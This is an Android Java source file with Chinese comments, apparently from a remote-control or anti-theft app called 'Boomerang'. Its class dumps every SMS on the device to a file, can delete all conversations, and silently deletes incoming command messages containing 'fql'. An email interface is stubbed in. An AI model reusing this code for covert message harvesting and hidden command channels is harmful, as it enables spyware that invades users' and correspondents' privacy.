package Boomerang_android15.com;


import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;


import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class OperateSMS 
{
    /** Called when the activity is first created. */
 
    private String m_smsFullName; //用来保存电话薄信息的文件的文件的全路径
    private BufferedWriter m_bw;  //写操作也可以考虑使用 FileOutputStream 方式
    private File m_smsFile; //用来保存电话薄信息的文件的文件对象
  
  

    //配置信息相关
    SetInformation m_settingInfor;    //配置文件的设置信息
    String m_configFilePath;  //配置文件的路径
    
    //网络相关
    FqlEmail m_mailPort;  //通往电子邮件的接口
    

    //支持加密功能
	encryption myEncrpt = new encryption();
	
	Context m_context;
	

    
    public OperateSMS(Context context)
    {
    	
    	String strUriInbox = "content://sms/inbox";		//SMS_INBOX:1
    	String strUriFailed = "content://sms/failed";	//SMS_FAILED:2
    	String strUriQueued = "content://sms/queued";	//sms_queued:3
    	String strUriSent = "content://sms/sent";	//sms_sent:4
    	String strUriDraft = "content://sms/draft";	//sms_draft:5
    	String strUriOutbox = "content://sms/outbox";	//sms_outbox
    	String strUriUndelibered = "content://sms/undelivered";	//sms_undelivered 未送达的
    	String strUriAll = "content://sms/all"; //SMS_all
    	String strUriConversations = "content://sms/conversations";
    	m_context = context;
    	initialize();
    }
    

    
    //////////////////////////////////////////////////////////
    //
    //函数功能:初始化
    //
    /////////////////////////////////////////////////////////////
    private void initialize()
    {
    	//1.获得配置文件路径
        Log.i("333+++", "ProcessPhoneBook initialize: begin!");
        m_configFilePath = m_context.getFilesDir()+ java.io.File.separator + m_context.getString(R.string.config_file);
   
        //2.读取配置文件信息
        m_settingInfor = new  SetInformation(m_configFilePath);     
        m_settingInfor.ReadConfigFile();
   
        //3.获得创建电话薄文件的全路径
        //m_phoneFullName = m_settingInfor.GetDataPath() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        m_smsFullName = m_context.getFilesDir() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        
		///////////////////////////////////////////
		// 4.设置加密密钥
		//////////////////////////////////////////////
		String password = m_settingInfor.GetPassWord();
		myEncrpt.SetKey(password.substring(0, 8));
    	
    	
    }//end function
    
    /////////////////////////////////////////////////////////////
    //
    //函数功能:保存短信内容到指定文件
    //注:供人员阅读
    ////////////////////////////////////////////////////////////////
    private void SaveSMSInfor()
    {
    	//创建保存电话薄信息的文件
        CreateSMSFile();                
        
        //将电话薄中的信息写入文件保存
        GetSMSText();
        
        //关闭电话薄文件
        CloseSMSFile();    	
    	
    }//end function
    
    //////////////////////////////////////////////////////////////
    //
    //函数功能:创建保存短信内容的文件
    //目前的处理方式是:如果发现重名文件删除后重新创建,这种处理方式可能
    //会存在一定的风险,以后最好改成发现重名重明文原有文件的方式.
    ///////////////////////////////////////////////////////////////
    private  void CreateSMSFile()
    {   

        //与文件相关的操作      
    	m_smsFile =  new java.io.File(m_smsFullName);  
    
        if (m_smsFile.exists())
        {
            //如果文件已经存在将文件删除
        	m_smsFile.delete();     
        }
        else
        {
            try
            {
            	m_smsFile.createNewFile();
            }
            catch (Exception e)
            {
                e.printStackTrace();        
            }
      
        }//end if   
      
        try
        {
        	OutputStream out = new FileOutputStream(m_smsFile); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK")); 
            //m_bw = new java.io.BufferedWriter(new java.io.FileWriter(m_smsFile));               
           
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    
    }//ProcessPhoneBook()
    
    //////////////////////////////////////////////////////////////
    //
    //函数功能:关闭保存短信内容的文件
    //
    //
    ///////////////////////////////////////////////////////////////
    private void CloseSMSFile()
    {
      
        try
        { 
            m_bw.flush();
            m_bw.close();
            
          
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    }
    
    ///////////////////////////////////////////////////////
    //
    //函数功能:获得用户的短信息内容,将其保存到文件中
    //
    ///////////////////////////////////////////////////////
    private void GetSMSText()
    {
		 
		 String strSMSAddress = new String();
		 String StrSMSPerson = new String();
		 String strSMSdate = new String();
		 String strSMSType = new String();
		 String strSMSSubject = new String();
		 String strSMSText = new String();
		 
    	
    	String strUriInbox = "content://sms"; //所有类型邮箱的短信都列出来
    	Uri uriSms = Uri.parse(strUriInbox);  //If you want to access all SMS, just replace the uri string to "content://sms/"
    	Cursor c = m_context.getContentResolver().query(uriSms, null, null, null, null);
    	while (c.moveToNext())
    	 {    
    		 try    
    		 {        
    			 //Read the contents of the SMS;    
    			
    			 //读取短信的内容
    			 strSMSAddress = c.getString(2);
    			 StrSMSPerson = c.getString(3);
    			 strSMSdate = c.getString(4);
    			 strSMSType = c.getString(8);
    			 strSMSSubject = c.getString(10);
    			 strSMSText = c.getString(11);
    			 
    			 //短信来源手机号
    	         m_bw.write(strSMSAddress);
    	         m_bw.newLine();
    	         
    	         //短信来源用户名
    	         m_bw.write(StrSMSPerson);
    	         m_bw.newLine();
    	         
    	         //发送,接收时间
    	         m_bw.write(strSMSdate);
    	         m_bw.newLine();
    	         
    	         //标示是在收件箱/发送箱/还是草稿箱中
    	         m_bw.write(strSMSType);
    	         m_bw.newLine();
    	         
    	         //短信主题
    	         m_bw.write(strSMSSubject);
    	         m_bw.newLine();
    	         
    	         //短信内容
    	         m_bw.write(strSMSText);
    	         m_bw.newLine();
    	         
    	         m_bw.write(" ");
    	         m_bw.newLine();
    		
    			 
    		
    		 }    
    		 catch (Exception e)    
    		 {    
    			 
    		 }//end try
    	} //end while    	
    	
    }
    
    private void SendSMSFile()
    {
    	
    	
    	
    }//end function
    
    
    /////////////////////////////////////////////////////////////
    //
    //函数功能:删除所有短信
    //
    //
    //////////////////////////////////////////////////////////////////
    private void DelAllSMS()
    {

		String pid = new String();
		String uri = new String();
    	
    	String strUriInbox = "content://sms";
    	Uri uriSms = Uri.parse(strUriInbox);  //If you want to access all SMS, just replace the uri string to "content://sms/"
    	Cursor c = m_context.getContentResolver().query(uriSms, null, null, null, null);
    	while (c.moveToNext())
    	{        
    		pid = c.getString(c.getColumnIndex("thread_id"));  //Get thread id;        
        	uri = "content://sms/conversations/" + pid;        
        	m_context.getContentResolver().delete(Uri.parse(uri), null, null); 
    		
    	} //end while    	
    	
    	
    }//end function
    
    ///////////////////////////////////////////////////////////
    //
    //函数功能:删除记录短信内容的文件
    //
    //
    ////////////////////////////////////////////////////////////
    private void DelSMSFile()
    {
    	
    }//end function
    
    //////////////////////////////////////////////////////////
    //
    //函数功能:删除指令控制短信
    //
    //////////////////////////////////////////////////////////
    public void deleteCommandSMS()
    {
    	             
    	String strSMSText = new String();
    	String strStandardText = new String();
		String pid = new String();
		String ids [] = new String[1];
		String uri = new String();
		int index = 0;
		int count = 0;
    	
    	String strUriInbox = "content://sms/inbox";
    	Uri uriSms = Uri.parse(strUriInbox);  //If you want to access all SMS, just replace the uri string to "content://sms/"
    	Cursor c = m_context.getContentResolver().query(uriSms, null, null, null, null);
    	String names[] = c.getColumnNames();
    	
    	c.moveToFirst();
    	do
    	{    
    		try    
    		{        
     			strSMSText = c.getString(c.getColumnIndex("body"));  //在ophone中保存短信内容在12处.在andriod保存短信内容在11处.  			 
    			if (strSMSText == null)
    			{
    				//短信内容为空
    				break;
    			}
    			strStandardText = strSMSText.toLowerCase();
    			Log.i("333+++", "strStandardText:");
				Log.i("333+++",strStandardText);
    			index = strStandardText.indexOf("fql"); //搜索String中的substring,默认从0位开始
    			if (-1 != index)
    			{
    				
    				//有效短信息
    				
    				ids[0] = c.getString(c.getColumnIndex("_id"));
    				pid = c.getString(c.getColumnIndex("thread_id"));  //Get thread id;     
    				
   
        			uri = "content://sms/conversations/" + pid;        
        			m_context.getContentResolver().delete(Uri.parse(uri), "_id=?", ids); 
    					
    			}//end if
    			 
    		
    		}    
    		catch (Exception e)    
    		{    
    			Log.i("333+++", "Exception e");
    			
    		}//end try
    	}
    	while (c.moveToNext());//end while    	
    	
    }//end function

    
    //////////////////////////////////////////////////////////////////////
    //
    //函数功能:加密短信文件
    //
    /////////////////////////////////////////////////////////////////////////
    private void EncrptSMSFile()
    {
    	
    	
    }//end function
    

    
    
}

/*
for(int i=0; i<c.getColumnCount(); i++)        
{            
	 strColumnName = c.getColumnName(i);            
	 strColumnValue = c.getString(i);  
	
}//end for       

//Delete the SMS      

String pid = c.getString(1);  //Get thread id;        
String uri = "content://sms/conversations/" + pid;        
getContentResolver().delete(Uri.parse(uri), null, null);      
*/     